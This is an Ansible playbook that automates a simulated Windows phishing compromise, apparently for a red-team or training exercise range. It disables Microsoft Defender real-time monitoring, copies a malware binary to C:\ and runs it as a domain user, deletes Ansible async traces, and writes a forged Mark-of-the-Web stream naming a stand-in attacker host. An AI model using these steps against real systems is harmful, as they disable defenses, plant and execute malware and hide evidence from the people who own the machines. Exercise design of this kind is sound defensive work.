---
- name: Running Windows Phishing Attack
  hosts: all
  gather_facts: no
  vars:
    ansible_password: "{{ passwd_pfx + adm_passwd }}"
    ansible_user: "{{ adm_name }}"

  tasks:
  - name: Gathering facts
    block:
    - name: Gathering facts
      setup:
      register: setup_output

    rescue:
      - name: Print when errors
        ansible.builtin.debug:
          msg: 'Possibly wrong OS type, Ansible can only manage desktop OSs including Windows 8.1, and 10, and server OSs including Windows Server 2012, 2012 R2, 2016, 2019, and 2022.'
        when: (setup_output.msg is search("System.OutOfMemoryException")) or (setup_output.module_stderr is search("System.OutOfMemoryException"))

      - name: Print when errors
        ansible.builtin.debug:
          msg: 'Winrm is down for the host'
        when: (setup_output.msg is search("port=5985"))

      - name: Ending play
        ansible.builtin.meta: end_host

  - name: Check if User is admin
    win_command: whoami /groups
    become: yes
    become_method: runas
    become_user: "{{ usr_name }}@{{ domain_name }}"
    vars:
      ansible_become_pass: "{{ passwd_pfx + usr_passwd }}"
    register: results

  - name: Whaling attack
    block:
    - set_fact:
        r: "{{  21 | random(start=1) }}"
      run_once: yes

    - name: Print 20 sided Die Result
      ansible.builtin.debug:
        var: r

    - name: "End play if admin"
      debug:
        msg: "{{ usr_name }} is an admin user"

    - name: Ending play
      ansible.builtin.meta: end_play
      when: r != '20'

    - name: Whaling Attack Success
      debug:
        msg: "You're gonna need a bigger boat"
    when: (results.stdout is search("Admin"))

  - name: Disable realtime monitoring
    ansible.windows.win_powershell:
      script: |
        Set-MpPreference -DisableRealtimeMonitoring $true

  - name: Checking Defender Settings
    ansible.windows.win_powershell:
      script: |
        $Preferences = Get-MpPreference
        $Preferences.DisableRealtimeMonitoring
    register: host_out

  - name: Copies the Malware
    ansible.windows.win_copy:
      src: "{{ directory + malware_name }}"
      dest: C:\{{ malware_name.split("_")[0] }}
      force: yes


  - name: Run The Malware
    ansible.windows.win_command: "{{ malware_name.split('_')[0] }}"
    become: yes
    become_method: runas
    become_user: "{{ usr_name }}@{{ domain_name }}"
    vars:
      ansible_become_pass: "{{ passwd_pfx + usr_passwd }}"
    args:
      chdir: C:\
    async: 10
    poll: 0

  - name: Delete Async Directory
    ansible.windows.win_file:
      path: C:\Users\{{ usr_name }}\.ansible_async
      state: absent

  - name: Add MOTW to malware
    ansible.windows.win_powershell:
      script: |
        Set-Content .\{{ malware_name.split("_")[0] }} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3', 'ReferrerUrl=https://www.this_is_not_evil/install/', 'HostUrl=https://kali.offensive.{{ attack_team }}/install/bin/{{ malware_name.split("_")[0] }}'
      chdir: C:\
    register: pwsh_output

#  - name: Check Mark of The Web
#    ansible.windows.win_powershell:
#      script: |
#        Get-Content C:\{{ malware_name.split("_")[0] }} -Stream Zone.Identifier
#    register: pwsh_output

#  - debug:
#     var: pwsh_output
